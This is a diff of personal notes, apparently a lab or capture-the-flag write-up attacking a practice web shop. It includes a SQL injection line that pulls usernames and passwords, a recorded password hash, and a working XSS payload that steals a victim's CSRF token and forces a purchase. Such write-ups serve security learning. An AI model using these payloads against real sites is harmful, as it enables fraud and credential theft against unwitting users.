@@ -353,10 +353,36 @@ UNION SELECT 1,user_name,password FROM users--
 
 ![[Pasted image 20260605112157.png]]
 
+### Analyzing the POST request. 
+
+![[Pasted image 20260609122158.png]]
+
+I see a csrf_token being passed what if I delete the csrf token.
+![[Pasted image 20260609122516.png]]
+![[Pasted image 20260609122531.png]]
+
 **bob**
 c00f1cd79cb8cf5507f8c3484c2d300c6aac2ea8f4f606987789662f7e5c7b72
 
 This is the hash value i guess 
+
+The thought process is send bob a request stell his csrf token and make him buy something. 
+```
+
+<img src=x onerror="fetch('/item/6').then(r=>r.text()).then(h=>{var d=document.createElement('div');d.innerHTML=h;var t=d.querySelector('[name=csrf_token]').value;fetch('/buy/6',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'csrf_token='+t})})">
+
+```
+
+![[Pasted image 20260609124149.png]]
+
+I saw bob buy this. 
+
+![[Pasted image 20260609124214.png]]
+
+
+![[Pasted image 20260609124046.png]]
+
+
 ## Delete one of the items originally listed for sale
 
 Exploiting the input type="hidden" 
@@ -435,3 +461,17 @@ it got redirected
 ![[Pasted image 20260608182505.png]]
 
 ## Hint" While registering it made it as a Seller Account 
+
+![[Pasted image 20260609120055.png]]
+
+You go to the main page register as a Seller Account 
+
+![[WhatsApp Image 2026-06-08 at 7.05.56 PM.jpeg]]
+
+
+![[Pasted image 20260609120122.png]]
+![[Pasted image 20260609120038.png]]
+![[Pasted image 20260609120316.png]]
+
+
+![[Pasted image 20260609120333.png]]
